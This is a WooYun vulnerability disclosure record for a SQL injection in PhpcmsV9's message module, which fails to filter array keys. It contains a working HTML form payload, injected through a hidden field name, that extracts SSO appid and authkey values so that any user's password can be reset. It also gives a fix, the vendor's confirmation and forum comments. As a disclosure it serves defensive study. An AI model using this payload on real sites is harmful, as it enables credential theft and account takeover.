{"id": 14488, "wybug_id": "wooyun-2013-017032", "wybug_title": "PhpcmsV9 SQL注射 2013年贺岁第二发", "wybug_corp": "phpcms", "wybug_author": "我想拿个shell", "wybug_date": "2013-01-07 12:41", "wybug_open_date": "2013-02-21 12:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-21：\t细节向公众公开  简要描述： 第二发如约来到，感谢大家的关注，在第二发中使用了一个无限制的SQL注射，最终目的可以修改任意用户密码，建议确认安全危害等级为高。明天再更新下一个漏洞。 详细说明：  在/phpcms9/phpcms/modules/message/index.php中有代码如下：\n$messageid = $this->message_db->insert($_POST['info'],true);\ninsert方法是key value的，代码如下：\npublic function insert($data, $table, $return_insert_id = false, $replace = false) {\t\tif(!is_array( $data ) || $table == '' || count($data) == 0) {\t\t\treturn false;\t\t}\t\t\t\t$fielddata = array_keys($data);\t\t$valuedata = array_values($data);\t\tarray_walk($fielddata, array($this, 'add_special_char'));\t\tarray_walk($valuedata, array($this, 'escape_string'));\t\t\t\t$field = implode (',', $fielddata);\t\t$value = implode (',', $valuedata);\t\t$cmd = $replace ? 'REPLACE INTO' : 'INSERT INTO';\t\t$sql = $cmd.' `'.$this->config['database'].'`.`'.$table.'`('.$field.') VALUES ('.$value.')';\t\t$return = $this->execute($sql);\t\treturn $return_insert_id ? $this->insert_id() : $return;\t}\n嗯，很遗憾的是\narray_walk($fielddata, array($this, 'add_special_char'));\n中并没有对key做任何的过滤，所以，第一段提到的代码导致了一个SQL注射漏洞 ：（。到此，为了poc一下，我读取了我本地的authkey，接下来我已经可以重置任意用户密码了，后面的事情我就没有演示了。   漏洞证明：  读出了phpsso_server的appid和authkey，然后可以调用client.class.php中的ps_member_edit函数修改任意用户密码。\n\n表单如下：用户名什么的得自己改一改。\n<form name=\"myform\" action=\"http://localhost/phpcms9/index.php?m=message&c=index&a=reply\" method=\"post\" id=\"myform\"><table width=\"100%\" cellspacing=\"0\" class=\"table_form\"><tr><th>标 题：</th><td><input name=\"info[subject]\" type=\"text\" id=\"subject\" size=\"30\" value=\"Re: hh\"  class=\"input-text\"/></td></tr> <tr><th>内 容：</th><td><textarea name=\"info[content]\"  id=\"con\" rows=\"5\" cols=\"50\"></textarea></td></tr><input type=\"hidden\" name=\"info[replyid]\" value=\"2\" /> <input type=\"hidden\" name=\"info[send_to_id]\" value=\"cc\" /> <input type=\"hidden\" name=\"info[send_from_id]\" value=\"hh\"><!-- 漏洞的利用重点在这里开始 --><input type=\"hidden\" name=\"info[`status`) values ((Select group_concat(appid,CHAR(42),authkey) from v9_sso_applications),1,1,1,CHAR(104, 104),1)#]\" value=\"cc\" /> <!-- 漏洞的利用重点在这里结束 --><tr><th>验证码：</th><td><input name=\"code\" type=\"text\" id=\"code\" size=\"10\"  class=\"input-text\"/> <img id='code_img' onclick='this.src=this.src+\"&\"+Math.random()' src='http://localhost/phpcms9/api.php?op=checkcode&code_len=4&font_size=14&width=110&height=30&font_color=&background='></td></tr><tr><td></td><td colspan=\"2\"><label><input type=\"submit\" name=\"dosubmit\" id=\"dosubmit\" value=\"确 定\" class=\"button\"/></label></td></tr></table></form>\n   修复方案：  array_walk($fielddata, array($this, 'add_special_char'));在add_special_char函数内对key做过滤就可以了。   版权声明：转载请注明来源 我想拿个shell@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-01-07 15:44 厂商回复： 万分感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-07 12:44 |    \t\tRay \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:7        )\t\t \n  第二发如约到来，下一发又会是什么呢！    \n     2013-01-07 12:45 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  看到个提醒，第二集果然来了。。    \n     2013-01-07 12:51 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  ... 流行追美剧啊    \n     2013-01-07 13:14 |    \t\t1ee \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:14        | 看书中....)\t\t \n  果断关注    \n     2013-01-07 13:34 |    \t\thongygxiang \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:12        | 蛋疼)\t\t \n  果断关爱    \n     2013-01-07 14:27 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  给力！！继续关注    \n     2013-01-07 15:34 |    \t\t马杀鸡 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 作为一匹勇敢的马，杀鸡是必不可少的)\t\t \n  果然连载    \n     2013-01-07 16:31 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  先关注下    \n     2013-01-07 20:12 |    \t\t蓝风 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:25        | 崬汸慾哓 嗼檤焄垳皁 沓猵圊屾亾沬荖 颩憬...)\t\t \n  再关心下    \n     2013-01-07 21:08 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  建议确认安全危害等级为高 这句话很霸气哦    \n     2013-01-08 10:47 |    \t\tphpcms \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | )\t\t \n  @px1624 我们觉得这是中肯的建议。    \n     2013-01-27 01:45 |    \t\t无敌最寂寞 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:4        | alert('这个家伙很懒，什么都没有留下'))\t\t \n  貌似无法修改后台用户的吧，PHPCMS的后台我记得是个单独的表来着。。。    \n     2013-02-21 12:57 |    \t\t小黑要低调 \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:4        | 小黑一枚)\t\t \n  @phpcms 亲，你不是厂商么，咋成实习了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}